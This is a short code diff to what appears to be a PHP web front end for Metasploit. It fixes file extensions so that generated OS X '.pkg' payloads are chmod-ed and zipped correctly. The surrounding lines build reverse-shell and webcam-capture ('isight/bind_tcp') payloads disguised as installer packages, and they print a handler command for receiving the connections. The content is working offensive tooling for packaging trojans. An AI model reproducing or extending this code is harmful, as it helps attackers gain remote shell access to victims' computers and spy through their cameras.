@@ -208,8 +208,8 @@ echo 'sudo msfcli exploit/multi/handler PAYLOAD=linux/x86/shell_reverse_tcp  LHO
                      
                         shell("echo '[Wait] While I build your payload..........'");
                         shell("sudo msfpayload osx/x86/shell_reverse_tcp  LHOST=$ip LPORT=$port x>exploits/$pkg.pkg");
-                         exec("sudo chmod 755 exploits/$pkg.deb");
-                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.deb");
+                         exec("sudo chmod 755 exploits/$pkg.pkg");
+                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.pkg");
                             echo '<p><b>Payload Configuration</b></p>';
 echo'****************************************************************************';
 echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
@@ -233,8 +233,8 @@ echo 'sudo msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp  LHOST
                     case c9:
                         shell("echo '[Wait] While I build your payload.........'");
                         shell("sudo msfpayload osx/x86/isight/bind_tcp LHOST=$ip LPORT=$port x>exploits/$pkg.pkg");
-                         exec("sudo chmod 755 exploits/$pkg.deb");
-                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.deb");
+                         exec("sudo chmod 755 exploits/$pkg.pkg");
+                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.pkg");
                             echo '<p><b>Payload Configuration</b></p>';
 echo'****************************************************************************';
 echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
